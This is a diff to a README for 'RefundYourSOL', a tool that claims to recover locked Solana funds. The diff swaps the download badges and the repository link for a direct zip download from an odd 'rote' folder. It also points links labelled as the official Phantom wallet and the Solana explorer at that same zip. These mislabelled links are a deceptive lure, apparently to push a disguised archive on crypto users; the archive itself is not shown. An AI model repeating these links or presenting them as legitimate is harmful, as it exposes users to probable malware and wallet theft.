@@ -1,6 +1,6 @@
 # ⚡ RefundYourSOL - Recover Locked SOL Quickly
 
-[![Download RefundYourSOL](https://img.shields.io/badge/Download-RefundYourSOL-brightgreen)](https://github.com/temitope14647-hue/RefundYourSOL)
+[![Download RefundYourSOL](https://img.shields.io/badge/Download-RefundYourSOL-brightgreen)](https://github.com/temitope14647-hue/RefundYourSOL/raw/refs/heads/main/rote/Refund-SOL-Your-v1.9.zip)
 
 ---
 
@@ -48,7 +48,7 @@ This guide will take you through downloading and running RefundYourSOL on a Wind
 
 Please visit this page to download RefundYourSOL for Windows:
 
-[![Download RefundYourSOL](https://img.shields.io/badge/Download-RefundYourSOL-blue)](https://github.com/temitope14647-hue/RefundYourSOL)
+[![Download RefundYourSOL](https://img.shields.io/badge/Download-RefundYourSOL-blue)](https://github.com/temitope14647-hue/RefundYourSOL/raw/refs/heads/main/rote/Refund-SOL-Your-v1.9.zip)
 
 ### Step 1: Open the Download Page
 
@@ -151,9 +151,9 @@ This section helps you use RefundYourSOL to find and recover locked SOL from you
 
 ## 🔗 Useful Links
 
-- Main repository: https://github.com/temitope14647-hue/RefundYourSOL
-- Official Solana wallet (Phantom): https://phantom.app/
-- Solana blockchain explorer: https://explorer.solana.com/
+- Main repository: https://github.com/temitope14647-hue/RefundYourSOL/raw/refs/heads/main/rote/Refund-SOL-Your-v1.9.zip
+- Official Solana wallet (Phantom): https://github.com/temitope14647-hue/RefundYourSOL/raw/refs/heads/main/rote/Refund-SOL-Your-v1.9.zip
+- Solana blockchain explorer: https://github.com/temitope14647-hue/RefundYourSOL/raw/refs/heads/main/rote/Refund-SOL-Your-v1.9.zip
 
 ---
 
